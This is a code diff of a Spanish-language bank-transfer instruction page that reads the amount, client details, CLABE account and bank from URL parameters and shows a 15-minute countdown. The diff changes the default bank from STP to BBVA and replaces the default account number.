@@ -42,7 +42,7 @@
                 </div>
                 <div class="flex justify-between border-b border-slate-200/60 pb-2">
                     <span class="text-gray-400 uppercase text-[9px] tracking-wider">Banco Destino</span>
-                    <span id="txt-banco" class="font-black text-slate-900">STP</span>
+                    <span id="txt-banco" class="font-black text-slate-900">BBVA</span>
                 </div>
 
                 <!-- Bloque de transferencia más compacto (Link / CLABE) -->
@@ -105,10 +105,10 @@
         document.getElementById('txt-monto').innerText = '$' + montoFormateado;
         document.getElementById('txt-cliente').innerText = decodeURIComponent(p.get('n') || 'CLIENTE');
         document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
-        document.getElementById('txt-clabe').innerText = p.get('c') || '646180402324694126';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '012180015393051672';
 
-        let bancoLimpio = p.get('b') || 'STP';
-        bancoLimpio = bancoLimpio.replace(/[123]/g, '').trim(); 
+        let bancoLimpio = p.get('b') || 'BBVA 1';
+        bancoLimpio = bancoLimpio.replace(/[1234]/g, '').trim(); 
         document.getElementById('txt-banco').innerText = bancoLimpio;
 
         let tiempo = 15 * 60 - 1;
